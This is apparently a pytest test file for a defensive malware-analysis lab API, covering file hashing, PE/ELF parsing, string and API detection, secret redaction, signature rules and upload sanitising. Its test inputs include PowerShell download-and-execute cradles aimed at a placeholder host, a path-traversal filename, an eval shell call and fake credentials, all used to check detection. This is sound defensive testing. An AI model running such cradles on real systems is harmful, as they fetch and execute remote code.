import io
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.db.database import init_db
from app.engines.reverse_engineering import (
    calculate_file_hashes,
    calculate_entropy,
    detect_file_signature,
    parse_pe_metadata,
    parse_elf_metadata,
    extract_static_strings,
    analyze_dangerous_apis,
    analyze_source_code_static,
    redact_sensitive_indicators,
    scan_yara_signatures_safe,
    check_ghidra_availability,
    check_sandbox_status,
    analyze_file_complete,
    export_re_report
)

client = TestClient(app)

@pytest.fixture(autouse=True)
def setup_db():
    init_db()


def test_hash_calculation():
    sample_data = b"AgentShield Reverse Engineering Safe Buffer Test"
    hashes = calculate_file_hashes(sample_data)
    assert len(hashes["sha256"]) == 64
    assert len(hashes["sha1"]) == 40
    assert len(hashes["md5"]) == 32
    assert hashes["size_bytes"] == len(sample_data)


def test_entropy_calculation():
    # Low entropy: uniform bytes
    zero_entropy = calculate_entropy(b"\x00" * 500)
    assert zero_entropy == 0.0

    # High entropy: diverse byte sequence
    diverse_bytes = bytes([i % 256 for i in range(1000)])
    high_entropy = calculate_entropy(diverse_bytes)
    assert high_entropy > 7.0


def test_file_signature_identification():
    # PE Header
    pe_bytes = b"MZ" + (b"\x00" * 0x3A) + b"\x40\x00\x00\x00" + b"PE\x00\x00\x64\x86"
    assert detect_file_signature(pe_bytes, "test.exe")["format"] == "PE"

    # ELF Header
    elf_bytes = b"\x7fELF\x02\x01\x01\x00" + (b"\x00" * 16)
    assert detect_file_signature(elf_bytes, "test.so")["format"] == "ELF"

    # PDF Header
    pdf_bytes = b"%PDF-1.7\n%sample pdf content"
    assert detect_file_signature(pdf_bytes, "doc.pdf")["format"] == "PDF"

    # ZIP Header
    zip_bytes = b"PK\x03\x04\x14\x00\x00\x00"
    assert detect_file_signature(zip_bytes, "archive.zip")["format"] == "ZIP"

    # Python Script
    py_bytes = b"#!/usr/bin/env python3\nimport os\nprint('hello')"
    assert detect_file_signature(py_bytes, "script.py")["format"] == "PYTHON"

    # PowerShell Script
    ps_bytes = b"param($Target) Write-Host 'Scanning' $Target"
    assert detect_file_signature(ps_bytes, "deploy.ps1")["format"] == "POWERSHELL"


def test_pe_metadata_parsing_valid_and_malformed():
    # 1. Malformed truncated PE
    truncated = b"MZ"
    res_trunc = parse_pe_metadata(truncated)
    assert res_trunc["is_valid_pe"] is False

    # 2. Synthetic PE structure (x86_64, 2 sections)
    e_lfanew = 0x80
    pe_header = bytearray(0x200)
    pe_header[0:2] = b"MZ"
    # Pointer to PE signature at 0x3C
    pe_header[0x3C:0x40] = e_lfanew.to_bytes(4, "little")
    # PE signature
    pe_header[e_lfanew:e_lfanew+4] = b"PE\x00\x00"
    # Machine: AMD64 (0x8664)
    pe_header[e_lfanew+4:e_lfanew+6] = (0x8664).to_bytes(2, "little")
    # Number of sections: 1
    pe_header[e_lfanew+6:e_lfanew+8] = (1).to_bytes(2, "little")
    # Opt Header Size: 0xE0
    pe_header[e_lfanew+20:e_lfanew+22] = (0xE0).to_bytes(2, "little")
    # Opt Header Magic: PE32+ (0x20B)
    pe_header[e_lfanew+24:e_lfanew+26] = (0x20B).to_bytes(2, "little")

    parsed = parse_pe_metadata(bytes(pe_header))
    assert parsed["is_valid_pe"] is True
    assert "AMD64" in parsed["machine"]
    assert parsed["architecture"] == "x86-64"


def test_elf_metadata_parsing():
    # 64-bit Little-Endian x86-64 ELF
    elf = bytearray(64)
    elf[0:4] = b"\x7fELF"
    elf[4] = 2  # 64-bit
    elf[5] = 1  # Little endian
    elf[7] = 3  # Linux
    elf[16:18] = (2).to_bytes(2, "little")   # ET_EXEC
    elf[18:20] = (62).to_bytes(2, "little")  # x86-64

    parsed = parse_elf_metadata(bytes(elf))
    assert parsed["is_valid_elf"] is True
    assert parsed["bitness"] == "64-bit"
    assert "x86-64" in parsed["machine"]


def test_static_strings_and_dangerous_apis():
    raw = (
        b"Welcome to Agent\x00"
        b"http://198.51.100.99:8080/payload.bin\x00"
        b"VirtualAlloc\x00"
        b"CreateRemoteThread\x00"
        b"C:\\Windows\\System32\\cmd.exe\x00"
        b"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
    )
    strings_res = extract_static_strings(raw)
    assert "198.51.100.99" in strings_res["extracted_ips"]
    assert any("http://198.51.100.99:8080/payload.bin" in u for u in strings_res["extracted_urls"])
    assert any("System32" in p for p in strings_res["extracted_paths"])

    apis = analyze_dangerous_apis(strings_res["sample_strings"])
    api_names = [a["api"] for a in apis]
    assert "VirtualAlloc" in api_names
    assert "CreateRemoteThread" in api_names
    assert any(a["mitre_technique"] == "T1055.002" for a in apis)


def test_source_code_analysis_and_secret_redaction():
    code_with_secrets = """
import os
import subprocess

AWS_KEY = "AKIA1234567890ABCDEF"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

eval("os.system('whoami')")
subprocess.Popen(["cmd.exe", "/c", "dir"])
"""
    # 1. Redaction check
    redacted = redact_sensitive_indicators(code_with_secrets)
    assert "AKIA1234567890ABCDEF" not in redacted
    assert "[REDACTED_ACCESS_KEY]" in redacted
    assert "[REDACTED_JWT_TOKEN]" in redacted

    # 2. AST Security Findings check
    analysis = analyze_source_code_static(code_with_secrets, "python")
    assert analysis["total_security_findings"] >= 2
    types = [f["type"] for f in analysis["findings"]]
    assert "Dynamic Code Evaluation" in types
    assert "Subprocess Invocation" in types
    assert analysis["is_suspicious_script"] is True


def test_yara_safe_scanning():
    # Sample containing UPX signature
    upx_sample = b"This is a sample binary with UPX0 and UPX1 section headers embedded."
    res = scan_yara_signatures_safe(upx_sample, "packed.exe")
    rule_names = [m["rule_name"] for m in res["matches"]]
    assert "Packer_UPX_Executable" in rule_names

    # Sample containing ransomware note extortion keywords
    ransom_sample = b"All your files have been encrypted! Contact decryptor service and pay in bitcoin."
    res_ransom = scan_yara_signatures_safe(ransom_sample, "readme.txt")
    rule_names_ransom = [m["rule_name"] for m in res_ransom["matches"]]
    assert "Ransomware_Extortion_Note_Pattern" in rule_names_ransom


def test_ghidra_and_sandbox_safety_status():
    ghidra = check_ghidra_availability()
    assert "installed" in ghidra
    assert "status" in ghidra
    assert "setup_guide" in ghidra
    # Should report unavailable cleanly if Ghidra is not in PATH/GHIDRA_HOME rather than fake results
    if not ghidra["installed"]:
        assert ghidra["status"] == "UNAVAILABLE"

    sandbox = check_sandbox_status()
    assert sandbox["host_execution"] == "STRICTLY_DISABLED"
    assert sandbox["sandbox_isolation"] == "ENFORCED"
    assert sandbox["default_mode"] == "STATIC_SECURE"


def test_api_upload_endpoint_and_audit_trail():
    content = b"echo 'testing reverse engineering upload endpoint'\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.99/stager.ps1')"
    files = {"file": ("test_stager.ps1", io.BytesIO(content), "text/plain")}
    res = client.post("/api/forensics/re-lab/upload", files=files)
    assert res.status_code == 200
    data = res.json()
    assert data["filename"] == "test_stager.ps1"
    assert len(data["sha256_hash"]) == 64
    assert data["severity"] in {"HIGH", "CRITICAL"}
    assert "ai_explanation_en" in data
    assert "ai_explanation_hinglish" in data


def test_api_upload_path_traversal_neutralization():
    content = b"benign test script content for path traversal test"
    malicious_filename = "../../../../evil_traversal.sh"
    files = {"file": (malicious_filename, io.BytesIO(content), "text/plain")}
    res = client.post("/api/forensics/re-lab/upload", files=files)
    assert res.status_code == 200
    data = res.json()
    # Traversal slashes must be stripped out of filename
    assert "/" not in data["filename"]
    assert "\\" not in data["filename"]
    assert ".." not in data["filename"]
    assert "evil_traversal.sh" in data["filename"]


def test_api_code_analysis_endpoint():
    payload = {
        "code": "powershell.exe -ExecutionPolicy Bypass -Command iex(New-Object Net.WebClient).DownloadString('http://198.51.100.99/agent.ps1')",
        "language": "powershell",
        "filename": "memory_stager.ps1"
    }
    res = client.post("/api/forensics/re-lab/analyze-code", json=payload)
    assert res.status_code == 200
    data = res.json()
    assert data["severity"] in {"HIGH", "CRITICAL"}
    assert data["verdict"] in {"MALICIOUS_THREAT_DETECTED", "SUSPICIOUS_UNTRUSTED_ARTIFACT"}
    assert len(data["indicators"]) >= 1


def test_api_re_lab_history_and_detail():
    res = client.get("/api/forensics/re-lab/history")
    assert res.status_code == 200
    history = res.json()
    assert isinstance(history, list)
    assert len(history) >= 2  # Seeded records exist

    sample_id = history[0]["id"]
    detail_res = client.get(f"/api/forensics/re-lab/analysis/{sample_id}")
    assert detail_res.status_code == 200
    sample = detail_res.json()
    assert sample["id"] == sample_id
    assert "sha256_hash" in sample


def test_api_report_downloads():
    # Test JSON download
    res_json = client.get("/api/forensics/re-lab/report/re-analysis-001/download?format=json")
    assert res_json.status_code == 200
    assert "application/json" in res_json.headers["content-type"]
    dossier = res_json.json()
    assert "integrity_sha256" in dossier
    assert len(dossier["integrity_sha256"]) == 64

    # Test Plaintext human-readable download
    res_txt = client.get("/api/forensics/re-lab/report/re-analysis-001/download?format=txt")
    assert res_txt.status_code == 200
    assert "text/plain" in res_txt.headers["content-type"]
    assert "AGENTSHIELD REVERSE ENGINEERING INVESTIGATION DOSSIER" in res_txt.text
    assert "SHA-256" in res_txt.text


def test_api_ai_explain():
    body_en = {
        "analysis_id": "re-analysis-001",
        "question": "What does this sample do?",
        "language": "en"
    }
    res_en = client.post("/api/forensics/re-lab/ai-explain", json=body_en)
    assert res_en.status_code == 200
    data_en = res_en.json()
    assert "AMOJA AI Analyst Response" in data_en["answer"]
    assert data_en["language"] == "english"

    body_hi = {
        "analysis_id": "re-analysis-001",
        "question": "Ye sample kya karta hai aur risk kya hai?",
        "language": "hinglish"
    }
    res_hi = client.post("/api/forensics/re-lab/ai-explain", json=body_hi)
    assert res_hi.status_code == 200
    data_hi = res_hi.json()
    assert "AMOJA AI Analyst Response" in data_hi["answer"]
    assert data_hi["language"] == "hinglish"


def test_api_tools_status():
    res = client.get("/api/forensics/re-lab/tools-status")
    assert res.status_code == 200
    status = res.json()
    assert "ghidra" in status
    assert "yara" in status
    assert "sandbox" in status
